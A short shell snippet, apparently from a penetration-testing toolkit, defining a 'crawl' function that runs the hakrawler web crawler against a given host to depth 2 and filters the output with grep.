# Crawl Website using Hakrawler
crawl(){
# echo "http://192.168.182.126/" | hakrawler -d 2 -u | grep -v -E "assets|.com"
echo http://$1/ | hakrawler -d 2 -u | grep -v -E "$2|$3"
}

